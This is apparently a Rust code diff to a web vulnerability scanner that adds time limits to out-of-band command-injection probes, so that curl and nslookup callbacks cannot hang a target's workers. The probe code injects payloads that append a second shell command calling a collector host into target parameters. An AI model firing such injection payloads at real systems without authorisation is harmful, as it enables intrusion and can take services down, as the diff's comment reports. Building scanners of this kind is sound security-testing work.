@@ -141,6 +141,24 @@ const SLEEP_THRESHOLD_MS: u128 = 3800;
 // Two large coprime factors for the reflected-cmdi echo oracle. Their product is a distinctive
 // 11-digit number that appears in the response only if a shell evaluated `$((A*B))`; the literal
 // payload never contains it. Chosen so the product is unlikely to occur naturally in any page.
+/// Out-of-band payloads carry their own deadline.
+///
+/// The probe injects a command that calls home. If the collector is
+/// unreachable - no egress, a firewall, a lab with no route out - a bare
+/// `curl` sits in a TCP connect for around two minutes, inside the target's
+/// request handler, holding whatever worker served it. Ten of those per string
+/// argument is how a scan stops the thing it is scanning: measured on dvga,
+/// whose `systemDebug(arg:)` runs `ps {arg}` through os.popen, a GraphQL pass
+/// left the application not answering at all, twice.
+///
+/// Three seconds is far longer than a callback needs and far shorter than a
+/// worker can be spared. A target that cannot reach us in three seconds was
+/// never going to confirm this finding anyway.
+pub const OOB_CURL: &str = "curl -s --connect-timeout 2 --max-time 3";
+/// BIND's nslookup accepts `-timeout=`; busybox ignores unknown options rather
+/// than failing, so this is safe on both.
+pub const OOB_NSLOOKUP: &str = "nslookup -timeout=2";
+
 pub const CMDI_ECHO_A: u64 = 199_933;
 pub const CMDI_ECHO_B: u64 = 314_573;
 const MAX_ENDPOINTS: usize = 300;
@@ -2288,10 +2306,15 @@ async fn probe_cmdi(
             let _ = send_site(
                 client,
                 site,
-                &format!("{base}{sep}curl http://{host}/c{close}"),
+                &format!("{base}{sep}{OOB_CURL} http://{host}/c{close}"),
             )
             .await;
-            let _ = send_site(client, site, &format!("{base}{sep}nslookup {host}{close}")).await;
+            let _ = send_site(
+                client,
+                site,
+                &format!("{base}{sep}{OOB_NSLOOKUP} {host}{close}"),
+            )
+            .await;
         }
         if let Ok(mut v) = q.lock() {
             v.push(PendingOob {
